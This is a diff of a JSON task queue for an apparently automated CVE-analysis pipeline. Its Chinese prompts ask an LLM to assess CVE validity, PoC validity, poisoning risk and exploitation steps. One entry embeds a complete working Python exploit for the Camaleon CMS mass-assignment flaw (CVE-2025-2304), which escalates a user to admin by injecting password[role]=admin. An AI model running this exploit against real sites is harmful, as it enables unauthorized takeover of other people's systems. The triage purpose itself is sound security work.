`http://127.0.0.1:3000`.\n- The username and password are sent from the browser to the local backend only on localhost.\n- The backend sends the username and password to Check Point through the Management API login request.\n- Passwords are not logged by the app.\n- The Check Point session ID is stored only in server memory for the life of the local Node process.\n- The **Allow self-signed certificate** option keeps TLS encryption but disables certificate validation. Use it only when needed.\n\n## API Commands Used\n\nThe backend proxies these Check Point Management API commands:\n\n- `login`\n- `logout`\n- `publish`\n- `show-simple-gateways`\n- `show-generic-object`\n-\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
-    "retry_count": 0,
+    "retry_count": 1,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
-    "error_type": null,
-    "last_error": null,
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
     "created_at": 1781820874.1270294,
-    "last_attempt": 0,
-    "next_attempt": 1781820879.693421,
+    "last_attempt": 1781850244.8794222,
+    "next_attempt": 1781850253.8081708,
     "metadata": {},
     "task_id": "task_CVE-2026-50751_1781820874",
     "required_result_fields": [
@@ -2090,17 +2061,75 @@
   {
     "cve_id": "CVE-2026-50752",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-50752\", \"sources\": [\"OSCS\"], \"descriptions\": [\"\\u6807\\u9898: Check Point IKEv1 \\u8bc1\\u4e66\\u9a8c\\u8bc1\\u7ed5\\u8fc7\\u6f0f\\u6d1e\"], \"published_date\": null, \"last_modified_date\": null, \"cvss_score\": null, \"severity\": null, \"references\": []}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] Researchers release details, PoC for exploited Check Point VPN flaw (CVE-2026-50751) - Help Net Security\n [description] 1 week ago - WatchTowr researchers have disclosed a technical analysis and PoC exploit for an actively exploited Check Point VPN flaw (CVE-2026-50751).\n [link] https://www.helpnetsecurity.com/2026/06/12/cve-2026-50751-poc-exploit/\n [webpage 0 end]\n[webpage 1 begin] [title] Patch Critical Check Point VPN Vulnerability (CVE-2026-50751)- Check Point Blog\n [description] 1 week ago - Check Point issues an urgent hotfix for CVE-2026-50751, a critical IKEv1 VPN authentication bypass vulnerability under active exploitation.\n [link] https://blog.checkpoint.com/security/check-point-releases-important-hotfix-for-vulnerabilities-in-deprecated-ikev1-vpn-protocol/\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - XZ1r0/cve-2026-poc-collection: CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs · GitHub\n [description] CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs - XZ1r0/cve-2026-poc-collection\n [link] https://github.com/XZ1r0/cve-2026-poc-collection\n [webpage 2 end]\n[webpage 3 begin] [title] GitHub - 0xMarcio/cve: Latest CVEs with their Proof of Concept exploits. · GitHub\n [description] Rust implementation Exploit/PoC of CVE-2026-31431-Linux-Copy-Fail, allow executing customized shellcode (such as Meterpreter).\n [link] https://github.com/0xMarcio/cve\n [webpage 3 end]\n[webpage 4 begin] [title] GitHub - zulloper/cve-poc: CVE POC repo 자동 수집기 · GitHub\n [description] CVE-2026-27771 - Gitea/Forgejo Container Registry Auth Bypass Exploit PoC - Pull private container i...\n [link] https://github.com/zulloper/cve-poc\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/649edd9e9f52f834748b352a2535059d/README.md\n---\n# CVE Web Check\n\nAn approval-based local webapp for scanning and remediating potential Check Point CVE-2026-50751 and CVE-2026-50752 exposure with trusted Check Point Management API commands.\n\nThis tool is not created or supported by Check Point and should be used at your own risk. Remediation is temporary. Check Point recommends patching quickly using the patches provided for each CVE in the [Check Point Security Advisories](https://support.checkpoint.com/security-advisories).\n\nThe app runs locally, logs in to a Check Point Security Management Server or MDS, scans relevant VPN configuration, shows exactly where remediation may be needed, lets an operator approve the changes, applies the changes through the Management API, and can publish the management session. Policy still needs to be installed after publishing for the remediation changes to take effect on gateways.\n\n## What It Checks\n\n### IKE Version Global Property Scan and Remediate (CVE-2026-50751)\n\nScans the SMS global Remote Access VPN property:\n\n```text\nremote-access.vpn-authentication-and-encryption.encryption-method\n```\n\nIf the current value is not `ike_v2_only`, the app can approve and apply a change to set the property to:\n\n```text\nike_v2_only\n```\n\nThis scan is intended to identify exposure where deprecated IKEv1 key exchange is still globally allowed for VPN Remote Access and Mobile Access. IKEv1 is deprecated and no longer industry best practice. This change can affect older VPN clients. Review [SK166415](https://support.checkpoint.com/results/sk/sk166415) for additional Check Point guidance.\n\n### Legacy Client's Allowed Check Scan and Remediate (CVE-2026-50751)\n\nScans simple gateways and checks each gateway generic object for the VPN realm inside:\n\n```text\nrealmsForBlades\n```\n\nThe app reports whether legacy clients are supported or disabled. When remediation is approved, it sets the VPN realm owned-object `disabled` value to `true`.\n\nUser-facing result text:\n\n- `Legacy clients are disabled`\n- `Legacy Clients are Supported`\n\nAllowing legacy clients can preserve support for IKEv1, which is no longer an industry best practice. We recommend disabling this setting unless legacy clients are still required. If legacy clients are needed, plan to migrate them to a more secure modern VPN client.\n\n### Site-to-Site VPN Communities Scan and Remediate (CVE-2026-50752)\n\nScans both Check Point site-to-site VPN community types:\n\n- Star communities\n- Mesh communities\n\nThe app flags a VPN community only when all of these are observed:\n\n- VPN site-to-site is enabled.\n- The VPN community uses IKEv1.\n- Gateways participating in the VPN community use certificate-based authentication.\n\nFor Star communities, the app displays center gateways and satellite gateways separately. Gateway names are tagged as locally managed or externally managed when the API data provides enough object type information.\n\nFor Mesh communities, the app pulls gateway names from the community `gateways` list. Mesh communities do not include externally managed gateway handling in this tool, so that field is shown as not applicable.\n\nWhen remediation is approved, the app attempts to set the VPN community encryption method to IKEv2 only. Star communities use:\n\n```text\nset-vpn-community-star\n```\n\nMesh communities use:\n\n```text\nset-vpn-community-meshed\n```\n\nIf a selected Star community includes externally managed gateways, the app warns before applying the change. You must make sure the matching IKEv2-only change is also made on the externally managed gateway side.\n\n## Workflow\n\n1. Log in with a Check Point Management API user.\n2. Click **Scan Check Point Config**.\n3. Review the SMS global property, legacy client gateway findings, and site-to-site VPN community findings.\n4. Approve only the changes you want to apply.\n5. Click the matching apply button.\n6. Publish from the tool or uncheck **Publish after successful apply** if you want to inspect and publish manually.\n7. Install policy after publishing so gateway-side changes take effect.\n\n## Security Notes\n\n- The app defaults to HTTPS when connecting to the Check Point management server.\n- Do not enter the management server as `http://...`; that would send the Check Point API login over cleartext HTTP.\n- The browser talks to the local backend over `http://127.0.0.1:3000`.\n- The username and password are sent from the browser to the local backend only on localhost.\n- The backend sends the username and password to Check Point through the Management API login request.\n- Passwords are not logged by the app.\n- The Check Point session ID is stored only in server memory for the life of the local Node process.\n- The **Allow self-signed certificate** option keeps TLS encryption but disables certificate validation. Use it only when needed.\n\n## API Commands Used\n\nThe backend proxies these Check Point Management API commands:\n\n- `login`\n- `logout`\n- `publish`\n- `show-simple-gateways`\n- `show-generic-object`\n-\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 1,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
+    "created_at": 1781820931.2598102,
+    "last_attempt": 1781850170.0517328,
+    "next_attempt": 1781850180.0806658,
+    "metadata": {},
+    "task_id": "task_CVE-2026-50752_1781820931",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2025-2304",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2025-2304\", \"sources\": [\"OSCS\"], \"descriptions\": [\"\\u6807\\u9898: CamaleonCMS \\u5b89\\u5168\\u6f0f\\u6d1e\"], \"published_date\": null, \"last_modified_date\": null, \"cvss_score\": null, \"severity\": null, \"references\": []}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2025-2304-POC/exploit.py at main · whiteov3rflow/CVE-2025-2304-POC\n [description] CVE-2025-2304 POC. Contribute to whiteov3rflow/CVE-2025-2304-POC development by creating an account on GitHub.\n [link] https://github.com/whiteov3rflow/CVE-2025-2304-POC/blob/main/exploit.py\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - d3vn0mi/CVE-2025-2304-POC · GitHub\n [description] A Proof of Concept (PoC) exploit for CVE-2025-2304, a critical mass assignment vulnerability in Camaleon CMS that allows privilege escalation from low-privileged users to administrators.\n [link] https://github.com/d3vn0mi/cve-2025-2304-poc\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - whiteov3rflow/CVE-2025-2304-POC: CVE-2025-2304 POC\n [description] Mass assignment vulnerability in the updated_ajax method allows authenticated users to escalate privileges to admin by injecting password[role]=admin parameter during password change.\n [link] https://github.com/whiteov3rflow/CVE-2025-2304-POC\n [webpage 2 end]\n[webpage 3 begin] [title] GitHub - LNEYYY/POC-2025: 收集整理漏洞EXP/POC,大部分漏洞来源网络，目前收集整理了1400多个poc/exp，长期更新。\n [description] 收集整理漏洞EXP/POC,大部分漏洞来源网络，目前收集整理了1400多个poc/exp，善用CTRL+F搜索 · 感谢以下贡献者为本项目做出的贡献，同时也欢迎各位师傅提交PR/issues共同维护：\n [link] https://github.com/LNEYYY/POC-2025\n [webpage 3 end]\n[webpage 4 begin] [title] GitHub - 0xMarcio/cve: Latest CVEs with their Proof of Concept exploits. · GitHub\n [description] PoC Exploit for the NTLM reflection SMB flaw. ... Escalation of Privilege to the root through sudo binary with chroot option. CVE-2025-32463\n [link] https://github.com/0xMarcio/cve\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/d4b69649348756722d2e86735bd18e37/CVE-2025-2304.py\n---\nimport requests\nimport sys\nimport argparse\nfrom urllib.parse import urlparse\nfrom bs4 import BeautifulSoup\nimport time\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"CVE-2025-2304 - Camaleon CMS >2.9.1 Privilege Escalation by Mass Assignment Exploit Tool - PoC\")\n    parser.add_argument(\"--target\", type=str, required=True, help=\"Enter the target domain or ip. Ex: -t example.com\")\n    parser.add_argument(\"--port\", type=str, default=80, required=True, help=\"Enter target port\")\n    parser.add_argument(\"-u\", type=str, required=True, help=\"Enter Camaleon CMS Username\")\n    parser.add_argument(\"-p\", type=str, required=True, help=\"Enter Camaleon CMS Password\")\n    \n    args = parser.parse_args()\n    \n    host = args.target.strip()\n    if not host.startswith(('http://', 'https://')):\n        if '://' in host:\n            print(\"Error: Unsupported URL protocol.\", file=sys.stderr)\n            sys.exit(1)\n        host = 'https://' + host\n    try:\n        dom = urlparse(host).hostname\n        \n        if not dom:\n           print(\"Error: Could not extract a valid domain or IP.\", file=sys.stderr)\n           sys.exit(1)\n        print(f\"Approaching target: {dom}\")\n    except:\n        print(f\"Parsing error: {e}\", file=sys.stderr)\n        sys.exit(1)\n           \n    port = f\"{args.port}\"\n    user = f\"{args.u}\"\n    password = f\"{args.p}\"\n\n    session = requests.Session()\n    csrf_token = get_token(session, dom, port)\n    \n    if not csrf_token:\n        print(\"[-] Failed to retrieve CSRF token. Exiting.\")\n        sys.exit(1)\n\n    creds = {\n        \"authenticity_token\": csrf_token,\n        \"user[username]\": user,\n        \"user[password]\": password\n    }\n    \n    url = f\"http://{dom}:{port}/admin/login\"\n    \n    print(\"[*] Attempting Authentication...\")\n    try:\n        r = session.post(url, data=creds)\n        if \"Username or Password incorrect\" in r.text:\n            print(\"[-] Login Failed! Username or Password incorrect\")\n            sys.exit(1)\n        else:\n            print(\"[$] Login Successful\")\n            try:\n                ex = exploit(session,dom,port,csrf_token,password,user)\n            except:\n                sys.exit(1)\n    except:\n        sys.exit(1)\n\ndef get_token(session,dom,port):\n    try:\n        print(\"[*] Getting CSRF token...\")\n        url = f\"http://{dom}:{port}/admin/login\"\n        req = session.get(url)\n        soup = BeautifulSoup(req.text, 'html.parser')\n    \n        meta_tag = soup.find('meta', attrs={'name': 'csrf-token'})\n        if meta_tag:\n            csrf_token = meta_tag.get('content')\n            print(f\"[+] CSRF Token Found: {csrf_token}\")\n            time.sleep(3)\n            return csrf_token\n        return None\n    except:\n        print(\"[-] Target is Invalid, check the target domain or ip and port\")\n\ndef exploit(session,dom,port,csrf_token,password,user):\n    \n    user_id = find_userid(session,dom,port)\n    url = f\"http://{dom}:{port}/admin/users/{user_id}/updated_ajax\"\n    print(f\"[*] Exploiting : {url}\")\n    payload = {\n        \"_method\":\"patch\",\n        \"authenticity_token\": csrf_token,\n        \"password[password]\":password,\n        \"password[password_confirmation]\":password,\n        \"password[role]\": \"admin\"\n    }\n    header = {\n        \"Content-Type\":\"application/x-www-form-urlencoded; charset=UTF-8\"\n    }\n    ex = session.post(url, data=payload, headers=header)\n    time.sleep(3)\n    if ex.status_code == 200:\n        dashboard_url = f\"http://{dom}:{port}/admin/dashboard\"\n        req = session.get(dashboard_url)\n        if \"Administrator\" in req.text:\n            print(\"[$] Successfully Escalated Privilege from Client to Admin...\")\n            print(f\"[#] User:{user} is now an Administrator :)\")\n        else:\n            print(\"[-] Exploit Failed!\")\n            return None\n            \ndef find_userid(session,dom,port):\n    url = f\"http://{dom}:{port}/admin/profile/edit\"\n    req = session.get(url)\n    soup = BeautifulSoup(req.text, 'html.parser')\n    input_tag = soup.find('input', attrs = {'name': 'user[id]'})\n    if input_tag:\n        user_id = input_tag.get(\"value\")\n        return user_id\n\nif __name__ == \"__main__\":\n    main()\n\n\n---\n/tmp/d4b69649348756722d2e86735bd18e37/README.md\n---\n# Camaleon CMS (>v2.9.1) - Mass Assignment leads to Privilege Escalation Exploit Tool - PoC \n\n## Description\n\nThis project is a Python-based exploitation proof of concept tool that demonstrates and analyzes a privilege escalation vulnerability affecting >v2.9.1 of Camaleon CMS. The script automates the process of authenticating to a target instance, retrieving application state information, and validating whether a vulnerable code path is present.\n\n## Requirements\n\n```bash\npip install requests beautifulsoup4\n```\n\n## Usage\n\n```bash\npython exploit.py --target <host> --port <port> -u <username> -p <password>\n```\n\n### Example\n\n```bash\npython exploit.py --target example.com --port 80 -u testuser -p Password123\n```\n\n## Arguments\n\n\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
     "retry_count": 0,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
     "error_type": null,
     "last_error": null,
-    "created_at": 1781820931.2598102,
+    "created_at": 1781850222.6655288,
     "last_attempt": 0,
-    "next_attempt": 1781820936.9771752,
+    "next_attempt": 1781850228.035149,
     "metadata": {},
-    "task_id": "task_CVE-2026-50752_1781820931",
+    "task_id": "task_CVE-2025-2304_1781850222",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-9256",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-9256\", \"sources\": [\"OSCS\"], \"descriptions\": [\"\\u6807\\u9898: NGINX ngx_http_rewrite_module\\u5806\\u7f13\\u51b2\\u533a\\u6ea2\\u51fa\\u6f0f\\u6d1e\"], \"published_date\": null, \"last_modified_date\": null, \"cvss_score\": null, \"severity\": null, \"references\": []}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] NGINX ngx_http_rewrite_module vulnerability CVE-2026-9256\n [description] 1 month ago - Security Advisory Description NGINX Plus and NGINX Open Source have a vulnerability in the ngx_http_rewrite_module module. This vulnerability exists when a rewrite directive uses a regex pattern with distinct, overlapping Perl-Compatible Regular Expression (PCRE) captures (for example, ^/((.*))$) and a replacement string that references multiple such captures (for example, $1$2) in a redirect or arguments context.\n [link] https://my.f5.com/manage/s/article/K000161377\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - Threekiii/CVE: 一个 CVE 漏洞预警知识库，无 exp/poc，部分包含修复方案。A knowledge base of CVE security vulnerability, no PoCs/exploits.\n [description] CVE-2026-9256：NGINX ngx_http_rewrite_module 堆缓冲区溢出漏洞.md · CVE-2026-23631：Redis Lua 脚本远程代码执行漏洞.md · CVE-2026-46300：Linux Kernel Fragnesia 本地权限提升漏洞.md · CVE-2026-4480：Samba 打印子系统远程代码执行漏洞.md ·\n [link] https://github.com/Threekiii/CVE\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - LNEYYY/POC-2025: 收集整理漏洞EXP/POC,大部分漏洞来源网络，目前收集整理了1400多个poc/exp，长期更新。\n [description] 收集整理漏洞EXP/POC,大部分漏洞来源网络，目前收集整理了1400多个poc/exp，善用CTRL+F搜索 · 感谢以下贡献者为本项目做出的贡献，同时也欢迎各位师傅提交PR/issues共同维护：\n [link] https://github.com/LNEYYY/POC-2025\n [webpage 2 end]\n[webpage 3 begin] [title] GitHub - binganao/vulns-2022: 本项目用于搜集 2022 年的漏洞，注意：本项目并不刻意搜集 POC 或 EXP，主要以CVE-2021、CVE-2022 为关键词，包含但不限于漏洞资讯、漏洞复现、漏洞分析、漏洞验证、漏洞利用\n [description] 本项目用于搜集 2022 年的漏洞，注意: 本项目并不刻意搜集 POC 或 EXP，包含但不限于漏洞资讯漏洞复现、漏洞分析、漏洞验证、漏洞利用\n [link] https://github.com/binganao/vulns-2022\n [webpage 3 end]\n[webpage 4 begin] [title] GitHub - xeloxa/CVE-2026-23918-Apache-H2-PoC: Proof-of-Concept exploit for CVE-2026-23918 (Apache mod_http2 double-free). Features multi-mode DoS (Rapid-RST, Slow-Drip) and passive RCE/vulnerability detection for Apache 2.4.66. · GitHub\n [description] May 7, 2026 - Proof-of-Concept exploit for CVE-2026-23918 (Apache mod_http2 double-free). Features multi-mode DoS (Rapid-RST, Slow-Drip) and passive RCE/vulnerability detection for Apache 2.4.66. - xeloxa/CVE-20...\n [link] https://github.com/xeloxa/CVE-2026-23918-Apache-H2-PoC\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/6259d0cc3b4522d7dd50afddd858bf63/CLAUDE.md\n---\n# CVE-2026-9256 Tracking — Claude Code Context\n\nThis repository contains a living tracking document for\n**CVE-2026-9256**, a heap buffer overflow in nginx's\n`ngx_http_rewrite_module`. The vulnerable code path is reached when a\n`rewrite` directive uses a PCRE regex with distinct, overlapping\ncaptures and a replacement string that references multiple such\ncaptures in a redirect or `arguments` context. An unauthenticated\nremote attacker can crash the worker by sending crafted HTTP requests;\ncode execution is possible on systems where ASLR is disabled or\nbypassed.\n\n- **Affected:** nginx 0.1.17 through 1.31.0 (mainline) and through 1.30.1\n  (stable). Both NGINX Open Source and NGINX Plus.\n- **Fixed:** nginx 1.31.1 (mainline) and 1.30.2 (stable), released\n  2026-05-22.\n- **Severity:** CVSS 3.1 8.1 (high), CVSS 4.0 9.2 (critical).\n- **Upstream advisory:** <https://nginx.org/en/security_advisories.html>\n- **Debian security tracker:**\n  <https://security-tracker.debian.org/tracker/CVE-2026-9256>\n\nThe rendered site is published at <https://kimmo.cloud/CVE-2026-9256/>.\n\n## Your task\n\nKeep `site/content/_index.md` (the canonical tracker) up to date as\nfixes land in the tracked distros. After edits, rebuild with\n`make build` and publish with `make dist`.\n\nA scheduled background agent runs against this repo to refresh the\ntracker on its own. If you find the file has been edited since you\nlast looked, that's likely why — re-read before assuming stale state.\n\n## Repo layout\n\n```\n.\n├── site/                                       # Hugo project\n│   ├── content/_index.md                       # the tracker — single source of truth\n│   ├── hugo.toml                               # config (subpath baseURL — don't break)\n│   ├── assets/css/extended/custom.css          # CSS overrides (PaperMod extension point)\n│   ├── assets/cve-2026-9256-tracker.svg        # social-banner source (rasterised by `make banner`)\n│   ├── static/cve-2026-9256-tracker.png        # rendered OpenGraph banner (committed)\n│   ├── layouts/partials/post_meta.html         # overrides PaperMod: adds labels + lastmod\n│   ├── layouts/partials/extend_footer.html     # client-side table compaction + status tagging + code-copy\n│   └── go.mod, go.sum                          # Hugo Modules — pulls PaperMod theme\n├── scripts/                                    # auto-update agent: prompt + driver\n│   ├── auto-update                             # wrapper invoked by the systemd timer\n│   └── auto-update-prompt.txt                  # prompt fed to headless Claude\n├── systemd/                                    # user-level timer + service units\n│   ├── cve-2026-9256-tracker-update.service    # runs scripts/auto-update\n│   └── cve-2026-9256-tracker-update.timer      # twice daily\n├── flake.nix, .envrc                           # Nix dev shell: hugo + go + git + resvg + curl\n├── Makefile                                    # `make build`, `make dist`, `make banner`\n├── LICENSE                                     # CC BY 4.0\n├── README.md                                   # user-facing project README\n├── WEBSITE.md                                  # publication plan / decisions log\n└── CLAUDE.md                                   # this file\n```\n\n## The tracker file (`site/content/_index.md`) — important constraints\n\n- It has Hugo front-matter with these required fields: `title`,\n  `description`, `layout: \"single\"`, `date` (published), `lastmod` (last\n  updated). Keep all five; the rendering depends on them.\n- There is no H1 in the body — Hugo emits the title from front-matter\n  via PaperMod's single-post layout. Don't add an H1 back.\n- The TOC is generated by PaperMod's auto-TOC (`ShowToc = true` +\n  `UseHugoToc = true` in `hugo.toml`). Don't add a manual TOC.\n- The \"Last updated\" date lives in the `lastmod` front-matter field.\n  Bump it on every content edit; leave it alone on a no-op run.\n- The `cover:` front-matter block points at 